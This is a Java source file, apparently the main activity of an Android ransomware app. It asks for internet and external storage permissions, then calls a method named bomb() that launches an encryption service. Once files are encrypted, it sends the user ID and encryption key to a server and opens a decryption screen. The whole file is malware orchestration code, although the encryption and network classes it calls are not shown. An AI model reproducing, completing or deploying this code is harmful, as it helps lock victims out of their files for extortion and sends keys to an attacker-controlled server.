package alepacheco.com.rw;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

import alepacheco.com.rw.activityes.DecryptActivity;
import alepacheco.com.rw.io.IO;
import alepacheco.com.rw.persistence.LocalStorage;
import alepacheco.com.rw.services.EncryptService;
import alepacheco.com.rw.services.MyService;

public class MainActivity extends Activity {
    String[] permissions = new String[]{
            Manifest.permission.INTERNET,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };
    Context ctx;
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ctx = this;

        if(isEncrypted()){
            if(!checkSendedToServer()){
                senDataToServer();
            }
            /*
            * show activity to decrypt
            * */
            startActivity(new Intent(this,DecryptActivity.class));
            return;
        }

        setContentView(R.layout.activity_main);

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Alert for permisions
            new AlertDialog.Builder(this)
                    .setTitle(alepacheco.com.rw.R.string.alert_title)
                    .setMessage(alepacheco.com.rw.R.string.alert_message)
                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            boolean permit = checkPermissions();
                            if (permit) {
                                bomb();
                            }
                        }
                    })
                    .setIcon(android.R.drawable.ic_dialog_info)
                    .show();
        } else {
            bomb();
        }
    }

    public void bomb(){
        new RunService().execute(ctx);
    }

    private Boolean isEncrypted(){
        return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
    }

    private Boolean checkSendedToServer(){
        return LocalStorage.getInstance(ctx).CheckSendedToServer();
    }

    private void senDataToServer(){
        IO.sendKeyToServer(ctx,
                    LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_ID_USER),
                    LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_KEY));
    }

    private class RunService extends AsyncTask<Context, Void, Void> {
        protected Void doInBackground(Context... parms) {
            SystemClock.sleep(1000);
            Intent srv = new Intent(parms[0], EncryptService.class);
            startService(srv);
            return null;
        }
    }

    private boolean checkPermissions() {
        int result;
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            result = ContextCompat.checkSelfPermission(this, p);
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), 100);
            return checkPermissions();
        }
        return true;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (requestCode == 100) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
               bomb();
            }
        }
    }
}



